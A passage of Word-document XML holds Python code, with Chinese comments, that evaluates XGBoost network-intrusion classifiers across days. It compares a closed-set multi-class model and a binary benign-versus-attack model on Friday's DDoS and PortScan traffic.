        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    a_map = {c: i for i, c in enumerate(a_classes)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4CDF4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y_a_tr = np.array([a_map[v] for v in y[is_train]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF3DFA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model_a = fit_xgb(Xs[is_train], y_a_tr, args.seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2AC0E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A927CAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pred_a = model_a.predict(Xs[is_test])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327B531A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    benign_idx = a_map["BENIGN"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E59DB7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alerted = pred_a != benign_idx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2623BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4396E51F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    friday = pd.DataFrame({"label": y[is_test], "alerted": alerted, "pred": pred_a})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD53BAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    exp_a = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35507F28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls, grp in friday.groupby("label"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F1789E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        exp_a[str(cls)] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50415418">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "rows": int(len(grp)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C069B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "alert_rate": round(float(grp["alerted"].mean()), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BEFB5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "predicted_as": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65125632">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                a_classes[i]: int(n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A7DD68">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for i, n in grp["pred"].value_counts().sort_index().items()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C805F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5B1872">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2309933E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("\n[实验 A] 闭集四类模型直接测周五（模型不知道 DDoS / PortScan 这两类存在）", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CB5789">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"{'周五真实类':&lt;12}{'行数':&gt;8}{'报警率':&gt;10}  预测去向", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3463E26F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls, row in exp_a.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A00DF31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        top = sorted(row["predicted_as"].items(), key=lambda kv: -kv[1])[:3]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E83244">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47997C36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"{cls:&lt;12}{row['rows']:&gt;8}{row['alert_rate']:&gt;10.2%}  "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D582F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            + "，".join(f"{k} {v}" for k, v in top),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE12E1C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F34EA1D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10993BC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out["A_closed_set"] = {"trained_classes": a_classes, "per_class": exp_a}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648A84FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AFFC357">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 实验 B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8E7C35">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 二分类：BENIGN=0，其余=1。这个问题比六类弱，但仍然跨天</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768DC46B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y_b_tr = (y[is_train] != "BENIGN").astype(int)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA08FFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y_b_te = (y[is_test] != "BENIGN").astype(int)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AD6797">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model_b = fit_xgb(Xs[is_train], y_b_tr, args.seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34EDEC9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pred_b = model_b.predict(Xs[is_test])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7EFEAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F4F24CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    b_names = ["BENIGN", "ATTACK"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C37EA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    exp_b = per_class_rows(y_b_te, pred_b, b_names)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DCDCAD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    acc_b = float((pred_b == y_b_te).mean())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586FCAC3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 按周五的攻击类型拆开看召回：二分类模型对 DDoS 和 PortScan 未必一样</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BA218A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    detail = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068ACB58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in sorted(set(y[is_test])):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF165EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        m = y[is_test] == cls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBCFCD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        detail[str(cls)] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69AB856D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "rows": int(m.sum()),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3677A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "attack_recall": round(float(pred_b[m].mean()), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161540ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3553EC84">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("\n[实验 B] 二分类（BENIGN vs 攻击）同样跨天", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12827B69">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"  准确率 {acc_b:.4f}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12635D96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for name, row in exp_b.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A464C23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"  {name:&lt;8} P {row['precision']:.4f}  R {row['recall']:.4f}  F1 {row['f1']:.4f}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E9858D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">              f"  样本 {row['support']}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C9F557">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out["B_binary"] = {"accuracy": round(acc_b, 4), "per_class": exp_b, "by_friday_class": detail}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAC56E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BDDD6EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out_path = Path(args.out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DEE6D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
